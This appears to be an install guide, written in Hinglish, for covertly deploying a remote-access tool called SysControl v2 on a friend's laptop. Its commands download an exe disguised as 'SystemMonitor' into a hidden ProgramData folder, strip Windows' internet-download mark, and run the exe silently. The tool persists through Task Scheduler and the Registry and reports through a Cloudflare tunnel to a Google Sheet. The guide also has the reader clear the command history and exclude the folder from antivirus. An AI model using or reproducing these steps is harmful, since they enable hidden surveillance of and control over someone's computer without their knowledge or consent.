# SysControl v2 — Install Guide

> Ab manual build/upload ki zaroorat nahi. Bas code push karo — sab automatic hai.
> GitHub Actions khud .exe build karke release bana deta hai.

---

## APNE LAPTOP PAR (Pehle Karo — Ek Baar)

### Release kaise hota hai (Automatic)

Ab manual build + upload nahi karna padta. Bas ye karo:

1. `backend/VERSION` file me naya version number likho (e.g. `3.3.0`)
2. Git push karo:
   ```
   git add -A; git commit -m "Release v3.3.0"; git push
   ```
3. GitHub Actions automatic:
   - `.exe` build karega (Windows runner par)
   - GitHub Release bana dega with `.exe` attached
   - Google Sheet "Updates" tab me naya row add karega
   - Devices ko frontend me "Update Available" dikhega

> Manual build sirf testing ke liye: `cd backend && build.bat`

---

## FRIEND KE LAPTOP PAR

### Kya chahiye

- Internet connection hona chahiye
- 2 minute ka time
- CMD **Run as Administrator** me kholna zaroori hai

---

### Step 1 — CMD kholo as Administrator

Start menu me `cmd` type karo → **Right-click** → **Run as administrator**

---

### Step 2 — Cloudflared install karo

```cmd
winget install Cloudflare.cloudflared --accept-package-agreements --accept-source-agreements
```

Agar winget na mile ya error aaye to ye paste karo:

```cmd
curl -L -o "%TEMP%\cloudflared.msi" https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.msi && msiexec /i "%TEMP%\cloudflared.msi" /qn && del "%TEMP%\cloudflared.msi"
```

---

### Step 3 — Hidden folder banao + exe download karo

```cmd
mkdir C:\ProgramData\SystemMonitor
```

```cmd
curl -L -o C:\ProgramData\SystemMonitor\SystemMonitor.exe https://github.com/le0-le0/SysControl-v2/releases/latest/download/SystemMonitor.exe
```

> `C:\ProgramData` Windows me by default hidden hota hai — normal user ko dikhta nahi.

---

### Step 4 — Internet download mark hatao

```cmd
echo. > "C:\ProgramData\SystemMonitor\SystemMonitor.exe:Zone.Identifier"
```

> Windows downloaded files ko "internet se aaya hai" mark karta hai aur silently block karta hai startup par. Ye usse hatata hai.

---

### Step 5 — Exe run karo (Admin CMD me)

```cmd
C:\ProgramData\SystemMonitor\SystemMonitor.exe
```

> Ye background me chala jayega. Kuch dikhega nahi. Task Scheduler + Registry dono me register ho jayega kyunki CMD admin hai.

---

### Step 6 — Check karo chal raha hai

```cmd
tasklist | findstr SystemMonitor
```

Agar `SystemMonitor.exe` dikhe to sab sahi hai.

---

### Step 7 — CMD band karo aur chale jao

- `Alt+F7` dabao CMD me (history clear)
- CMD band karo
- Ab laptop jab v restart hoga, program automatically start hoga

---

## FULL COPY-PASTE (Sab ek saath)

CMD as Administrator kholo aur ye **ek ek karke** paste karo:

```cmd
winget install Cloudflare.cloudflared --accept-package-agreements --accept-source-agreements
```

```cmd
mkdir C:\ProgramData\SystemMonitor
```

```cmd
curl -L -o C:\ProgramData\SystemMonitor\SystemMonitor.exe https://github.com/le0-le0/SysControl-v2/releases/latest/download/SystemMonitor.exe
```

```cmd
echo. > "C:\ProgramData\SystemMonitor\SystemMonitor.exe:Zone.Identifier"
```

```cmd
C:\ProgramData\SystemMonitor\SystemMonitor.exe
```

```cmd
tasklist | findstr SystemMonitor
```

> Total time: ~2 minute. Bas CMD admin me kholna mat bhoolna.

---

## KYA HOTA HAI AUTOMATICALLY

| Cheez | Kaise |
|-------|-------|
| Startup par auto-start | Task Scheduler (ONLOGON + HIGHEST) + Registry Run key |
| Device name | Laptop ka hostname use hota hai |
| Password | Random generate hota hai, Windows Credential Manager me save |
| Tunnel | Cloudflare Quick Tunnel, har restart par naya URL |
| Google Sheet me register | Har 3 minute heartbeat bhejta hai |
| Crash recovery | Crash hone par 10 sec baad khud restart |
| Hidden location | `C:\ProgramData\SystemMonitor\` — user ko dikhta nahi |
| Auto-update detection | Frontend me "Update Available" dikhata hai jab naya release aata hai |
| CI/CD | GitHub push par .exe automatic build + release hota hai |

---

## APNI SIDE SE VERIFY KARO

1. Apna frontend kholo (Netlify URL)
2. Login karo
3. 1-2 minute me device list me naya device dikhega — **Online** status ke saath
4. Click karke connect karo — password Google Sheet se auto-fill hota hai

---

## TROUBLESHOOTING

| Problem | Solution |
|---------|----------|
| Device nahi dikh raha | 2-3 min wait karo, pehla heartbeat register hone me time lagta hai |
| `winget` nahi mila | Step 2 me alternative curl command use karo |
| Download 0 bytes | GitHub repo **public** hona chahiye — private me 404 aata hai |
| Restart par start nahi hua | CMD **admin** me nahi khola tha — Task Scheduler fail hua. Dobara admin CMD se Step 5 run karo |
| Antivirus ne block kiya | `C:\ProgramData\SystemMonitor\` folder ko exclusion me add karo |
| Cloudflared not found | CMD band karke naya CMD kholo (PATH refresh hota hai) |
